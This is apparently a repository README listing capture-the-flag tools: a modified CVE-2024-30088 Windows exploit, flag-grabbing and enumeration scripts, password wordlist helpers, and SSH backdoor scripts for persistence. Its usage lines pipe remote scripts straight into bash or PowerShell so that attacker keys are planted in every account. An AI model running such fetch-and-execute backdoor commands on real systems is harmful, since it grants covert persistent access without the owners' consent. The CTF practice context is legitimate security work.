# CTF

## [CVE-2024-30088_flags.cpp](./CVE-2024-30088_flags.cpp) - Exploit for CVE-2024-30088 to Capture Flags

This is a modified exploit for **CVE-2024-30088**, designed to capture flags from a Windows system by exploiting a recent vulnerability. At the time, the exploit was effective, but it is expected to be patched on most up-to-date systems. It was fun while it lasted.


## [flagssh.sh](./flagssh.sh) - SSH Wrapper for Snatching Flags and Initial Enumeration

`flagssh.sh` is an SSH wrapper script to automate flag retrieval during SSH authentication, targeting both user and root flags on remote systems. In addition to capturing flags, it has great potential for adding more functionality to assist with initial enumeration, such as checking user permissions, sudo privileges, and transferring necessary tools for further exploitation.

#### Features:
- Automates SSH login and flag retrieval (user.txt, root.txt).
- Supports both password-based and key-based SSH authentication.
- Provides a flexible framework for adding additional enumeration tasks during the initial foothold phase.

#### Usage:
```bash
flagssh.sh <username>@<hostname> [<password_or_ssh_key>]
```

## [grepper.sh](./grepper.sh) - Targeted Search for Hidden Files in CTF Challenges

`grepper.sh` is a tool for (CTF) challenges where critical information, like passwords or flags, is hidden deep within the filesystem. The tool was created after encountering a CTF box with a hidden password buried in a `.log.gz` file, which was frustrating to locate manually. This script automates the search process by grepping for specific keywords in common directories and compressed files, making it easier to find those elusive clues. While it's a resource intensive tool, it is often a last resort after traditional enumeration techniques have failed.

#### Features:
- Searches for keywords in common system directories and within `.gz` compressed files.
- Designed to help in CTF scenarios where important files or logs are buried deep within the filesystem.
- Provides quick searches in common directories like `/opt` and `/var`.
- Automatically generates keywords based on system usernames and hostnames.
- Supports verbose output and searching binary files.

#### Usage:
```bash
grepper.sh [--all] [--path=dir1] [--path=dir2] ... [--verbose] [--auto] [--quick] [--gzip] [keyword1 [keyword2 ...]]
```

- `--all`: Include binary files in the search.
- `--path=dir`: Specify one or more directories to search.
- `--verbose`: Print detailed command output.
- `--auto`: Automatically generate keywords from system users and hostnames.
- `--quick`: Quickly search common directories `/opt` and `/var`.
- `--gzip`: Enable searching within `.gz` compressed files.


## [htb-usercontent.py](./htb-usercontent.py) - Fetch Hack The Box User-Generated Content

`htb-usercontent.py` is a script that interacts with the Hack The Box (HTB) API to retrieve all content generated by a specific user. This includes details about machines, challenges, and writeups the user has created. The tool is useful for OSINT allowing to quickly gain insights into a user's contributions on the HTB platform, such as which boxes they’ve created.


#### Usage:
```bash
htb-usercontent.py <user_id> [--proxy] [--ignore-ssl] [--machines] [--challenges] [--writeups]
```

- `<user_id>`: The HTB user ID you want to query.
- `--proxy`: Route requests through a proxy (useful for debugging).
- `--ignore-ssl`: Ignore SSL certificate verification.
- `--machines`: Print only information about machines created by the user.
- `--challenges`: Print only information about challenges created by the user.
- `--writeups`: Print only information about writeups authored by the user.

## [quickpass.py](./quickpass.py) - Search for Passwords in rockyou.txt Based on Keywords

`quickpass.py` is a simple yet effective script that searches the `rockyou.txt` wordlist for passwords related to specific keywords. It is particularly useful for boxes, where content creators sometimes use passwords that have some relation to the name of the box, service, or username. The script also supports searching in 1337-speak format for additional variations of the keywords.

#### Features:
- **Keyword-based password search**: Searches for passwords in `rockyou.txt` that match specific keywords, which can be related to the box name or service.
- **Leet-speak support**: Optionally convert the keyword into leet-speak and search for its variations.
- **Write results to file**: Saves matching passwords into `quickwins.txt` for easy access.

## [prefixsuffix.py](./prefixsuffix.py) - Generate Quick Custom Wordlist

`prefixsuffix.py` is a fast and customizable wordlist generator designed specifically for CTF challenges. It allows you to create targeted wordlists by combining predefined or custom prefixes and suffixes, making it ideal for situations where traditional wordlists like `rockyou.txt` take too long to process, especially against hashing algorithms or slow brute-force attacks.


#### Usage:
```bash
python3 prefixsuffix.py [--all] [--leet] [--prefix <prefix1> <prefix2>] [--suffix <suffix1> <suffix2>] [-cp]
```

- `--all`: Include lowercase versions of the predefined and additional prefixes.
- `--leet`: Apply Leet speak transformations to both prefixes and suffixes.
- `--prefix`: Add custom prefixes to the wordlist.
- `--suffix`: Add custom suffixes to the wordlist.
- `-cp` or `--custom-prefixes`: Use only the custom prefixes supplied and ignore the predefined ones.
- `--output`: Save the generated wordlist to a file (default: `prefixsuffix.txt`).


#### Usage:
```bash
quickpass.py <keywords> [--leet]
```

## [ssh-backdoor.ps1](./ssh-backdoor.ps1) - Quick and Easy SSH Persistence (Windows)

`ssh-backdoor.ps1` is a PowerShell script designed to simplify and automate the setup of SSH key-based persistance on Windows systems, especially for administrative users. This script manages SSH keys by configuring `authorized_keys` for individual users, setting up the required `administrators_authorized_keys` for admin accounts, and ensuring that proper permissions are enforced. 

### Features
- Creates `authorized_keys` in the `.ssh` directory for the current user, adding specified public keys for SSH access.
- Admin-Specific Configuration:
  - Creates and configures `administrators_authorized_keys` in `C:\ProgramData\ssh`, enforcing necessary permissions for the `Administrators` and `SYSTEM` groups.
  - Automatically updates SSH settings to ensure `PubkeyAuthentication` is enabled.
  - Adds keys to `authorized_keys` for all local user profiles on the system, providing SSH access across all accounts.
- Creates timestamped backups of any files it modifies, ensuring existing configurations are preserved.
- Restarts the SSH service if changes are made, but only if the script is run by an administrator.

### Usage:
To execute the script, run it in an elevated PowerShell prompt:
```powershell
Invoke-Expression (Invoke-WebRequest <script_url>)
```

## [ssh-backdoor.sh](./ssh-backdoor.sh) - Quick and Easy SSH Persistence

`ssh-backdoor.sh` is my absolute favourite script. It simplifies the process of setting up SSH persistence by adding public keys to the target's `~/.ssh/authorized_keys` file. This script ensures a secure and reliable backdoor for remote access if SSH login is available on the target machine. It performs the necessary directory and file setup, including backing up existing `authorized_keys`, setting appropriate permissions, and appending keys to the file.

The script is easy to curl into bash for fast execution and clean persistence.


#### Usage:
```bash
curl -sSL <script_url> | bash
```


